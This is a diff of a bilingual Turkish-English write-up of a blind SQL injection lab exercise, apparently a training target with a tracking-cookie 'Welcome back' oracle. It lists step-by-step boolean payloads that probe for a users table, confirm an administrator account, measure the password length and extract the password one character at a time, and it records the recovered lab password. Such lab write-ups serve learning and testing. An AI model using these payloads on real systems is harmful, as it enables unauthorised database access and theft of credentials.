@@ -41,15 +41,19 @@ Analiz:
 1-) Zaafiyetin doğru olup olmadığının kontrolü.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl'
+
 -> Eğer bu işlem işe yararsa -> dönüş doğru olacak -> Welcome back message
+
 -> Eğer bu işlem işe yaramazsa -> dönüş olmayacak -> No Welcome back message
 
 Sql tarafında çalıştırıldığını tahmin edebileceğimiz sorguları hayal etmemiz ve deneme yanılma yolu ile doğruluğunu tespit etmemiz gerekli.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=0--'
+
 ->Yanlış -> No Welcome back
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=1--'
+
 -> Doğru -> Welcome back
 
 
@@ -59,6 +63,7 @@ ________________________________________________________________________________
 2-) Bir Kullanıcı Tablosu Olup Olmadığını Kontrol Et
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select 'x' from users LIMIT 1)='x'--'
+
 -> users tablosu databasede mevcut.
 
 _______________________________________________________________________________________________________________________________________________________________________
@@ -67,6 +72,7 @@ ________________________________________________________________________________
 3-) Admin kullancısının Users tablosunda olup olmadığını kontrol et.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator')='administrator'--'
+
 -> Admin kullanıcısı databasedeki users tablosunda mevcut.
 
 _______________________________________________________________________________________________________________________________________________________________________
@@ -75,16 +81,23 @@ ________________________________________________________________________________
 4-) Admin şifresinin numaralandır.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select password from users where username='administrator')='Welcome2021!'--'
+
 -> Kaba kuvvet saldırı gibi olduğundan mantıklı bir sorgu olmayıp istediğimiz sonucu vermeyecektir.
 
 *Öncelikle password uzunluğunu bulmamız lazım.
-select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator' and LENGTH (password)>20)='administrator'--' ///->20 değerine kadar denemeler yapılabilir ancak
+
+select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator' and LENGTH (password)>20)='administrator'--' 
+
+///->20 değerine kadar denemeler yapılabilir ancak
+
 BurpSuit yardımı ile de kolaylıkla bulunması mümkün.
+
 ->Şifre uzunluğu 20 karakter.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select substring(password,2,1) from users where username='administrator')='a'--'
 
 123456789 10 11 12 13 14 15 16 17 18 19 20
+
 a1g2k2v3f  j  r  a  w  y  z  y  6  t  l  9
 
 
@@ -107,15 +120,19 @@ Analysis:
 1-) Checking whether the vulnerability is correct.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl'
+
 -> If this works -> return will be correct -> Welcome back message
+
 -> If this doesn't work -> no return -> No Welcome back message
 
 We need to imagine the queries that we can guess to be run on the SQL side and determine their accuracy by trial and error.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=0--'
+
 ->False -> No Welcome back
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=1--'
+
 -> Correct -> Welcome back
 
 _______________________________________________________________________________________________________________________________________________________________________
@@ -124,6 +141,7 @@ ________________________________________________________________________________
 2-) Check if there is a User Table
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select 'x' from users LIMIT 1)='x'--'
+
 -> users table exists in database.
 
 _______________________________________________________________________________________________________________________________________________________________________
@@ -132,6 +150,7 @@ ________________________________________________________________________________
 3-) Check if the Admin user is in the Users table.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator')='administrator'--'
+
 -> The admin user exists in the users table in the database.
 
 _______________________________________________________________________________________________________________________________________________________________________
@@ -140,15 +159,20 @@ ________________________________________________________________________________
 4-) Number of the admin password.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select password from users where username='administrator')='Welcome2021!'--'
+
 -> Since it is like a brute force attack, it is not a logical query and will not give the result we want.
 
 *First we need to find the password length.
+
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator' and LENGTH (password)>20)='administrator'--' 
+
 ///-> Attempts up to 20 can be done but It can be easily found with the help of BurpSuit.
+
 ->Password length 20 characters.
 
 select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select substring(password,2,1) from users where username='administrator')='a'--'
 
 123456789 10 11 12 13 14 15 16 17 18 19 20
+
 a1g2k2v3f  j  r  a  w  y  z  y  6  t  l  9
 
